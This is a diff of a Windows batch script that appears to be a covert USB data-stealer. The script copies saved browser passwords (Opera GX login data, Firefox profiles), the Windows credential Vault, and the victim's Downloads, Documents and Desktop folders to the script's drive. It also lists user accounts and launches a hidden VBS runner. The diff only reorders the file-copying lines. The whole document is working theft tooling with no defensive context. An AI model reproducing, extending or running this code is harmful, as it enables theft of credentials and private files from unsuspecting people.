@@ -4,10 +4,6 @@ mkdir lgdat
 mkdir dl
 cd ..
 
-xcopy C:\Users\%username%\Downloads\ %CD:~0,2%\out\dl\ /e /h
-xcopy C:\Users\%username%\Documents\ %CD:~0,2%\out\dl\ /e /h
-xcopy C:\Users\%username%\Desktop\ %CD:~0,2%\out\dl\ /e /h
-
 :: cua - computer user accounts
 net users > %CD:~0,2%\out\inf\cua.txt
 :: cui - current user info
@@ -29,5 +25,9 @@ xcopy "C:\Users\%username%\AppData\Roaming\Opera Software\Opera GX Stable\Login 
 xcopy "C:\Users\%username%\AppData\Local\Microsoft\Vault\" /s "%CD:~0,2%\out\lgdat\" /y
 :: copying firefox passwords
 xcopy "C:\Users\%username%\AppData\Mozilla\Firefox\Profiles\" /s "%CD:~0,2%\out\lgdat\" /y
+
+xcopy C:\Users\%username%\Downloads\ %CD:~0,2%\out\dl\ /e /h
+xcopy C:\Users\%username%\Documents\ %CD:~0,2%\out\dl\ /e /h
+xcopy C:\Users\%username%\Desktop\ %CD:~0,2%\out\dl\ /e /h
 
 wscript.exe "invis.vbs" eject.bat
